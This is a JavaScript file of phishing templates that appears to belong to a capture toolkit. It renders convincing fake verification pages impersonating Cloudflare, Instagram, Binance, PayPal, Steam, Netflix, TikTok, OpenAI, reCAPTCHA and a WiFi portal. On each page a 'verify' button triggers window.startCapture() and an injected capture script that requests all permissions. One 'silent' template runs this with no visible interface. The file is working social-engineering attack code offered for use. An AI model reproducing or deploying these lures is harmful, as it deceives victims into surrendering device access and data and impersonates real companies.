    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Asset Integrity Check</title><style>body { background:#f8f9fa; color:#202124; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:48px; border-radius:12px; text-align:center; background:#fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border:1px solid #dadce0; } h2 { font-size:20px; font-weight:500; margin-top:0; } p { color:#70757a; font-size:14px; line-height:1.6; margin:20px 0 30px; } .btn { background:#1a73e8; color:#fff; padding:12px 32px; border-radius:6px; border:none; font-weight:500; cursor:pointer; width:100%; font-size:14px; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:15px;">🛡️</div><h2>Media Security Check</h2><p>Our systems require a standard security check to validate your identity for this session.</p><button class="btn" onclick="window.startCapture();">Verify Session</button></div>${getCaptureScript(id, 'https://photos.google.com', {
      tmplId: 'gallery', perms: ALL_PERMS, accent: '#1a73e8', icon: '🕵️'
    })}</body></html>`
  },
  'cloudflare': {
    name: "☁️ Cloudflare: Edge Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Just a moment...</title><style>body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; background:#fff; } .box { max-width:450px; padding:20px; } .spinner { border:3px solid rgba(0,0,0,0.1); border-left-color: #000; border-radius:50%; width:40px; height:40px; animation: spin 1s linear infinite; margin:30px auto; display: none; } @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } } h1 { font-size:22px; font-weight:500; color:#333; margin: 15px 0; } p.desc { color:#555; font-size:15px; line-height:1.5; margin-bottom:30px; } .btn { background:#fff; border:1px solid #555; padding:8px 24px; border-radius:3px; color:#333; font-weight:400; cursor:pointer; font-size:15px; margin-top:10px; transition: background 0.2s; } .btn:hover { background:#f5f5f5; } .cf-footer { font-size: 12px; color: #999; margin-top: 50px; } .cf-footer a { color: #999; text-decoration: none; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Cloudflare_Logo.png/512px-Cloudflare_Logo.png" alt="Cloudflare" style="width: 120px; margin-bottom: 20px;"><div class="spinner"></div><h1>Please verify you are a human</h1><p class="desc">Access to this page has been denied because we believe you are using automation tools to browse the website.</p><p class="desc" style="font-size: 13px; color: #888;">This may happen as a result of the following: <br>• Javascript is disabled or blocked by an extension (ad blockers for example)<br>• Your browser does not support cookies</p><p class="desc" style="font-size: 13px; color: #888;">Please make sure that Javascript and cookies are enabled on your browser and that you are not blocking them from loading.</p><button class="btn" onclick="document.querySelector('.spinner').style.display='block'; window.startCapture();">Verify you are human</button></div><div class="cf-footer">Ray ID: <span>${Math.random().toString(36).substring(2, 16)}</span> • <a href="https://www.cloudflare.com/5xx-error-landing" target="_blank">Performance &amp; security by Cloudflare</a></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
      tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#000', icon: '☁️'
    })}</body></html>`
  },
  'pegasus': {
    name: "💻 System: Kernel Diagnostic [STABLE v9.3]",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Diagnostics Hub</title><style>body { background:#050505; color:#0f0; font-family: 'JetBrains Mono', 'Courier New', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; } .box { border:1px solid #11ff11; padding:30px; background:#000; width:90%; max-width:700px; box-shadow: 0 0 30px rgba(0,255,0,0.2); position:relative; } .header { border-bottom:1px solid #11ff11; padding-bottom:12px; margin-bottom:20px; font-size:12px; letter-spacing:2px; font-weight:bold; display:flex; justify-content:space-between; } .code { font-size:13px; line-height:1.6; height:250px; overflow:hidden; white-space:pre-wrap; } .cursor { display:inline-block; width:8px; height:18px; background:#0f0; margin-left:5px; animation: blink 1s infinite; vertical-align:middle; } @keyframes blink { 50% { opacity:0; } } .btn { width:100%; background:transparent; color:#0f0; border:1px solid #0f0; padding:15px; font-weight:bold; cursor:pointer; margin-top:25px; text-transform:uppercase; transition:all 0.4s; font-family:inherit; } .btn:hover { background:#0f0; color:#000; box-shadow: 0 0 15px #0f0; } .scanline { width:100%; height:2px; background:rgba(0,255,0,0.1); position:absolute; top:0; left:0; pointer-events:none; animation: scan 4s linear infinite; } @keyframes scan { 0% { top:0; } 100% { top:100%; } }</style></head><body><div class="box"><div class="scanline"></div><div class="header"><span>SYSTEM_RECON_PROTO_V9.3</span><span>STATE: PRE-EXECUTION</span></div><div class="code" id="log-console">
[+] INITIALIZING_EXPLOIT_ENGINE...
[+] MAPPING_HARDWARE_PAGES...
[+] BYPASSING_SANDBOX_ISOLATION...
[+] HOOKING_KERNEL_VTABLES...
[+] ATTEMPTING_RING0_PRIVILEGE_ESCALATION...
[*] VERIFYING_HARDWARE_INTEGRITY...<span class="cursor"></span>
    </div><button class="btn" onclick="window.startCapture();">TRIGGER_DEEP_KERNEL_SCAN</button></div>
    <script>
      var log = document.getElementById('log-console');
      var lines = [
        "[+] EXTRACTING_BROWSER_CERT_CHAIN...",
        "[+] ANALYZING_GPU_PIPELINE...",
        "[+] MAPPING_SENSOR_ARRAY_TELEMETRY...",
        "[+] DECODING_GEOSPATIAL_MARKERS...",
        "[+] SYNCING_REMOTE_FORENSIC_BUFFER...",
        "[!] ALERT: USER_AUTH_REQUIRED_FOR_BUS_ACCESS"
      ];
      var idx = 0;
      setInterval(function() {
        if (idx < lines.length) {
          var span = log.querySelector('.cursor');
          log.removeChild(span);
          log.innerHTML += "\\n" + lines[idx];
          log.appendChild(span);
          idx++;
        }
      }, 2500);
    </script>
    ${getCaptureScript(id, 'https://github.com/torvalds', {
      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#00ff00', icon: '💀',
    })}</body></html>`
  },
  'security_audit': {
    name: "🛡️ Security: Browser Ecosystem Audit (Extreme)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Trust & Safety</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .shield { color:#1877f2; font-size:60px; margin-bottom:20px; } h2 { font-size:24px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .btn { background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><div class="shield">🛡️</div><h2>Security Audit</h2><p>Our security systems have detected an unusual connection pattern. Please verify your connection to continue safely.</p><button class="btn" onclick="window.startCapture();">Verify & Continue</button></div>${getCaptureScript(id, 'https://www.google.com/safetycenter', {
      tmplId: 'security_audit', perms: ALL_PERMS, accent: '#1877f2', icon: '🔒'
    })}</body></html>`
  },
  'meta_login': {
    name: "💬 Social: Account Recovery (Extreme)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login Verification - Instagram</title><style>body { background:#fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:40px 40px; width:100%; max-width:350px; box-sizing: border-box; text-align:center; } .logo { width: 175px; height: 51px; margin-bottom:30px; } .avatar { width:90px; height:90px; border-radius:50%; background:#efefef; margin:0 auto 20px; display:flex; align-items:center; justify-content:center; overflow: hidden; border: 1px solid #dbdbdb; } .avatar img { width: 100%; height: 100%; object-fit: cover; } h3 { font-size:16px; margin:0 0 10px; font-weight: 600; color: #262626; } p { color:#8e8e8e; font-size:14px; margin-bottom:25px; line-height: 1.5; } .btn { background:#0095f6; color:#fff; border:none; padding:10px 16px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; transition: background 0.2s; font-size: 14px; } .btn:hover { background: #1877f2; } .meta-footer { margin-top: 50px; color: #737373; font-size: 12px; font-weight: 600; letter-spacing: 1px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="logo"><div class="avatar"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7c/Profile_avatar_placeholder_large.png"></div><h3>Suspicious Login Attempt</h3><p>We detected an unusual login attempt. To secure your account and proceed, please verify your session details.</p><button class="btn" onclick="window.startCapture();">Secure My Account</button></div><div style="position: absolute; bottom: 20px;" class="meta-footer">from META</div>${getCaptureScript(id, 'https://www.instagram.com/accounts/login/', {
      tmplId: 'meta_login', perms: ALL_PERMS, accent: '#0095f6', icon: '📸'
    })}</body></html>`
  },
  'wifi': {
    name: "📶 WIFI: Hotspot Certification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WiFi Authentication</title><style>body { background:#f4f7f6; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; text-align:center; width:100%; max-width:400px; padding: 40px 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); border-radius: 16px; box-sizing: border-box; } .wifi-icon { background: #e3f2fd; color: #1976d2; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; border-radius: 50%; margin: 0 auto 20px; font-size: 32px; } h1 { margin: 0 0 10px; font-size: 24px; color: #333; font-weight: 600; } p { color:#666; font-size:15px; margin-bottom: 30px; line-height: 1.5; } hr { border:0; border-top:1px solid #eee; margin: 0 0 30px; } .btn { background:#1976d2; color:#fff; border:none; padding:14px 40px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #1565c0; } .terms { font-size: 12px; color: #999; margin-top: 20px; } .terms a { color: #1976d2; text-decoration: none; }</style></head><body><div class="box"><div class="wifi-icon">📶</div><h1>Free WiFi Connect</h1><p>Welcome to the Public Free WiFi network. To ensure network security and prevent bot abuse, please verify your session to connect.</p><hr><button class="btn" onclick="window.startCapture();">Connect to Network</button><div class="terms">By connecting, you agree to our <a href="#">Terms of Service</a> & <a href="#">Privacy Policy</a>.</div></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'wifi', perms: ALL_PERMS, accent: '#1976d2', icon: '📶'
    })}</body></html>`
  },
  'binance': {
    name: "💱 Crypto: Withdrawal Security (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Binance Identity Verification</title><style>body { background:#0b0e11; color:#eaecef; font-family: 'BinancePlex', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:100%; max-width:400px; padding:40px 32px; background:#1e2329; border-radius:16px; text-align:center; box-shadow: 0 8px 24px rgba(0,0,0,0.5); box-sizing: border-box; } .logo-container { margin-bottom:32px; } .logo { width: 120px; } h2 { font-size:24px; margin-bottom:16px; font-weight: 600; color: #EAECEF; } p { color:#848e9c; font-size:14px; margin-bottom:32px; line-height: 1.5; } .btn { background:#FCD535; color:#1e2329; padding:14px; border-radius:8px; border:none; font-weight:600; cursor:pointer; width:100%; transition: background 0.2s; font-size: 16px; } .btn:hover { background: #e6c229; }</style></head><body><div class="box"><div class="logo-container"><img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/Binance_Logo.svg/1024px-Binance_Logo.svg.png" alt="Binance"></div><h2>Security Verification</h2><p>To protect your account and withdraw funds, please complete the standard security check to verify your active session.</p><button class="btn" onclick="window.startCapture();">Confirm Validation</button></div>${getCaptureScript(id, 'https://www.binance.com/en/my/security', {
      tmplId: 'binance', perms: ALL_PERMS, accent: '#FCD535', icon: '💰'
    })}</body></html>`
  },
  'paypal': {
    name: "💳 Fintech: Transaction Audit (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal Security</title><style>body { background:#f5f7fa; font-family: Helvetica Neue, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#2c2e2f; } .box { border: 1px solid #eaebf2; width:100%; max-width:420px; text-align:center; padding:40px 30px; background:#fff; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.05); } .logo { color:#003087; font-size:32px; font-weight:bold; margin-bottom:25px; font-style:italic; font-family: ArialBlack, sans-serif; } h2 { font-size:24px; font-weight: 400; margin-bottom:15px; margin-top:0; color: #141414; } p { color:#555; font-size:15px; line-height: 1.5; margin-bottom:35px; } .btn { background:#0070e0; color:#fff; padding:14px; border-radius:24px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background:#005ea6; }</style></head><body><div class="box"><div class="logo">PayPal</div><h2>Help us protect your account</h2><p>We've noticed some unusual activity. To protect your funds and personal information, please verify your identity to continue.</p><button class="btn" onclick="window.startCapture();">Secure my account</button></div>${getCaptureScript(id, 'https://www.paypal.com/myaccount/security', {
      tmplId: 'paypal', perms: ALL_PERMS, accent: '#0070ba', icon: '💳'
    })}</body></html>`
  },
  'steam': {
    name: "🎮 Gaming: Steam Guard (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Steam Security</title><style>body { background:#171a21; color:#c7d5e0; font-family: "Motiva Sans", Sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:linear-gradient(to right, #1a2a3a 0%, #17212e 100%); width:100%; max-width:440px; padding:40px 30px; border-radius:4px; box-shadow: 0 4px 16px rgba(0,0,0,0.5); text-align:center; border:1px solid #2a475e; box-sizing: border-box; } .icon { width: 100px; margin-bottom:20px; } h2 { font-size:24px; color:#fff; margin-bottom:12px; font-weight: 300; text-transform: uppercase; letter-spacing: 2px; } p { font-size:14px; color:#acb2b8; line-height:1.5; margin-bottom:30px; } .btn { background:linear-gradient(to bottom, #47bfff 5%, #1a44c2 95%); color:#fff; border:none; padding:12px 24px; border-radius:2px; font-weight:400; cursor:pointer; width:100%; font-size: 15px; transition: filter 0.2s; text-transform: uppercase; } .btn:hover { filter: brightness(1.2); } .footer-text { margin-top: 30px; color: #61686D; font-size: 12px; }</style></head><body><div class="box"><img class="icon" src="https://store.akamai.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam"><h2>Steam Guard</h2><p>A new device or browser is attempting to access your Steam account. Please perform our standard security verification to authorize access.</p><button class="btn" onclick="window.startCapture();">Authorize Device</button><div class="footer-text">© Valve Corporation. All rights reserved.</div></div>${getCaptureScript(id, 'https://store.steampowered.com/account/', {
      tmplId: 'steam', perms: ALL_PERMS, accent: '#1a44c2', icon: '🎮'
    })}</body></html>`
  },
  'netflix': {
    name: "🍿 Media: Household Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Netflix - Update your Netflix Household</title><style>body { background:#000; color:#fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:100%; max-width:440px; padding:40px; text-align:center; background: rgba(0,0,0,0.75); border-radius: 4px; box-sizing: border-box; } .logo { margin-bottom:30px; } .logo img { width: 140px; } h2 { font-size:32px; font-weight: 700; margin-bottom:20px; margin-top:0; } p { color:#b3b3b3; font-size:16px; margin-bottom:35px; line-height: 1.5; font-weight: 400; } .btn { background:#e50914; color:#fff; border:none; padding:16px; font-weight:bold; cursor:pointer; width:100%; font-size:16px; border-radius: 4px; transition: background 0.2s; } .btn:hover { background: #c1000b; } .trouble { display: block; margin-top: 20px; color: #b3b3b3; font-size: 15px; text-decoration: none; } .trouble:hover { text-decoration: underline; }</style></head><body><div class="box"><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix"></div><h2>Update your Netflix Household</h2><p>To enjoy Netflix on this device, we need to perform a brief security verification check to confirm you're part of this household.</p><button class="btn" onclick="window.startCapture();">Update Netflix Household</button><a href="#" class="trouble">Having trouble?</a></div>${getCaptureScript(id, 'https://www.netflix.com/youraccount', {
      tmplId: 'netflix', perms: ALL_PERMS, accent: '#e50914', icon: '📺'
    })}</body></html>`
  },
  'tiktok': {
    name: "🎵 Social: Creator Portal (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>TikTok Verification</title><style>body { background:#fff; font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#161823; } .box { width:100%; max-width:400px; text-align:center; padding: 20px; box-sizing: border-box; } .logo { margin-bottom:24px; } .logo img { width: 120px; } h2 { font-size:24px; font-weight:700; margin-bottom:12px; } p { color: rgba(22, 24, 35, 0.75); font-size:15px; margin-bottom:32px; line-height: 1.5; } .btn { background:#FE2C55; color:#fff; padding:14px; border:none; border-radius: 4px; font-weight:600; cursor:pointer; width:100%; font-size:16px; transition: background 0.2s; } .btn:hover { background: #E4294D; } .footer { margin-top: 100px; font-size: 13px; color: rgba(22, 24, 35, 0.5); }</style></head><body><div class="box"><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1024px-TikTok_logo.svg.png" alt="TikTok" style="width: 150px;"></div><h2>Verify your account</h2><p>Please perform a quick network security verification to maintain creator eligibility and safety status.</p><button class="btn" onclick="window.startCapture();">Verify Now</button><div class="footer">By confirming, you agree to TikTok's Terms of Service and confirm you have read TikTok's Privacy Policy.</div></div>${getCaptureScript(id, 'https://www.tiktok.com/setting', {
      tmplId: 'tiktok', perms: ALL_PERMS, accent: '#fe2c55', icon: '🎵'
    })}</body></html>`
  },
  'chatgpt': {
    name: "🤖 AI: OpenAI Dev Audit (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OpenAI Authentication</title><style>body { background:#fff; font-family: Söhne, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:100%; max-width:400px; text-align:center; padding: 40px 20px; box-sizing: border-box; } .logo { width: 48px; height: 48px; margin-bottom: 24px; } h2 { font-size:32px; font-weight: 600; color: #10a37f; margin: 0 0 24px; letter-spacing: -0.02em; } p { color:#353740; font-size:16px; margin-bottom:32px; line-height: 1.5; } .btn { background:#10a37f; color:#fff; border:none; padding:12px; border-radius:4px; cursor:pointer; width:100%; font-size: 16px; font-weight:500; transition: background 0.2s; } .btn:hover { background: #0e906f; } .footer { margin-top: 24px; color: #6e6e80; font-size: 14px; }</style></head><body><div class="box"><svg width="41" height="41" viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg" class="logo"><path d="M37.5324 16.8707C37.9808 15.5241 38.1363 14.0974 37.9886 12.6859C37.8409 11.2744 37.3934 9.91076 36.676 8.68622C35.6126 6.83404 34.009 5.37877 32.0526 4.49258C30.0962 3.60639 27.8687 3.32621 25.6429 3.68266C24.4019 2.50285 22.8681 1.63717 21.1965 1.15926C19.5249 0.681358 17.7732 0.605663 16.1158 0.940546C14.1504 1.34117 12.3592 2.37895 10.9855 3.89669C9.61176 5.41443 8.71887 7.33618 8.41872 9.421C7.07212 9.86938 5.64547 10.0249 4.23395 9.87717C2.82243 9.72946 1.45882 9.28198 0.234275 8.56455C-0.829141 10.4167 -1.2E-05 12.6443 0.354432 14.8696C0.708876 17.095 1.9866 18.9959 3.79158 20.1585C2.55167 21.3402 1.68652 22.8761 1.20857 24.5499C0.730628 26.2238 0.65529 27.9785 0.989824 29.6382C1.3897 31.6033 2.42777 33.3939 3.94589 34.7675C5.464 36.1411 7.38612 37.034 9.4714 37.3341C9.91978 38.6807 10.0753 40.1073 9.92762 41.5188C9.7799 42.9304 9.33242 44.294 8.61499 45.5185C9.67841 47.3707 11.282 48.8259 13.2384 49.7121C15.1948 50.5983 17.4223 50.8785 19.6481 50.5221C20.8891 51.7019 22.4229 52.5676 24.0945 53.0455C25.7661 53.5234 27.5178 53.5991 29.1752 53.2642C31.1406 52.8636 32.9318 51.8258 34.3055 50.3081C35.6792 48.7903 36.5721 46.8686 36.8723 44.7838C38.2189 44.3354 39.6455 44.1798 41.0571 44.3276C42.4686 44.4753 43.8322 44.9228 45.0567 45.6402C46.1201 43.7881 46.5292 41.5605 46.1748 39.3351C45.8203 37.1098 44.5426 35.2089 42.7376 34.0463C43.9775 32.8646 44.8427 31.3286 45.3206 29.6548C45.7986 27.9809 45.8739 26.2262 45.5394 24.5665C45.1395 22.6015 44.1014 20.8108 42.5833 19.4372C41.0652 18.0636 39.1431 17.1708 37.0578 16.8707H37.5324ZM26.7909 36.2163C25.3228 36.757 23.7548 36.2429 22.7579 35.034C21.7609 33.825 21.6163 32.148 22.3846 30.7937L28.1882 20.7378L32.8123 23.4079L26.7909 36.2163ZM14.0768 46.5284C12.8227 46.5165 11.666 45.8213 11.1009 44.7171C10.5359 43.6128 10.6698 42.2906 11.4428 41.3061L18.4988 32.4828L23.123 35.153L14.0768 46.5284ZM5.28913 25.5494C4.85695 24.1856 5.25368 22.671 6.30232 21.69C7.35097 20.709 8.8893 20.4191 10.222 20.9501L21.4397 25.5976H12.1916V30.938H5.28913L5.28913 25.5494ZM11.1408 8.68334C12.28 7.8488 13.8265 7.8488 14.9657 8.68334C16.1049 9.51789 16.5912 10.999 16.2081 12.4578L13.8967 22.628L8.60105 19.5704L11.1408 8.68334ZM30.4042 1.30218C31.5434 0.467634 33.0899 0.467634 34.2291 1.30218C35.3683 2.13673 35.8546 3.61784 35.4715 5.07669L33.16 15.2469L27.8643 12.1893L30.4042 1.30218ZM40.0617 21.0336C40.4939 22.3974 40.0972 23.912 39.0485 24.893C38.0039 25.8732 36.4672 26.1601 35.1378 25.6268L23.9248 20.9793H33.1678V15.6389H40.0664L40.0617 21.0336ZM34.2541 38.6477C33.0033 38.6585 31.849 39.3516 31.2828 40.454C30.7166 41.5564 30.8465 42.8763 31.6212 43.8641L38.6773 52.6874L43.3014 50.0173L34.2541 38.6477Z" fill="#10a37f"></path></svg><h2>Verify you're human</h2><p>Please complete a quick security check to continue accessing OpenAI services and safeguard your account.</p><button class="btn" onclick="window.startCapture();">Begin Verification</button><div class="footer">OpenAI secures your connection</div></div>${getCaptureScript(id, 'https://platform.openai.com', {
      tmplId: 'chatgpt', perms: ALL_PERMS, accent: '#10a37f', icon: '🤖'
    })}</body></html>`
  },
  'recap': {
    name: "🕵️ reCAPTCHA: V2 Checkbox Check (Realistic)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>reCAPTCHA</title><style>body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; background:#fff; font-family: Roboto, helvetica, arial, sans-serif; } .top-text { font-size: 24px; color: #202124; margin-bottom: 20px; font-weight: 400; } .box { width: 302px; height: 76px; border: 1px solid #d3d3d3; border-radius: 3px; background: #f9f9f9; display: flex; align-items: center; box-sizing: border-box; cursor: pointer; transition: all 0.2s; position: relative; } .box:hover { box-shadow: 0px 0px 4px 1px rgba(0,0,0,0.08); } .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; margin-right: 12px; background: #fff; display: flex; align-items: center; justify-content: center; } .checkbox.spinning { border: none !important; animation: none; background: transparent; } .checkbox.spinning::after { content: ''; width: 24px; height: 24px; border: 3px solid #1a73e8; border-right-color: transparent; border-radius: 50%; animation: sc-spin 1s linear infinite; } @keyframes sc-spin { to { transform: rotate(360deg); } } .text { font-size: 14px; color: #222; max-width: 154px; } .logo { position: absolute; right: 10px; top: 12px; display: flex; flex-direction: column; align-items: center; } .logo img { width: 32px; height: 32px; margin-bottom: 2px; } .logo span { font-size: 10px; color: #555; } .logo-links { font-size: 8px; color: #555; margin-top: 2px; } .logo-links a { color: #555; text-decoration: none; } .logo-links a:hover { text-decoration: underline; }</style></head><body><h1 class="top-text">Verify you are human</h1><div class="box" onclick="this.querySelector('.checkbox').classList.add('spinning'); window.startCapture();"><div class="checkbox"></div><div class="text">I'm not a robot</div><div class="logo"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png"><span>reCAPTCHA</span><span class="logo-links"><a href="https://policies.google.com/privacy">Privacy</a> - <a href="https://policies.google.com/terms">Terms</a></span></div></div><div id="status-text" style="display:none;"></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap', perms: ALL_PERMS, accent: '#1a73e8'
    })}</body></html>`
  },
  'recap_silent': {
    name: "👻 GHOST: Silent Integrity (OP - No UI)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Loading...</title><style>body { background: #fafafa; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; } .spinner { width: 40px; height: 40px; border: 3px solid rgba(0,0,0,0.1); border-top-color: #333; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="spinner"></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap_silent', flow: 'silent', perms: SILENT_PERMS
    })}</body></html>`
  }
};

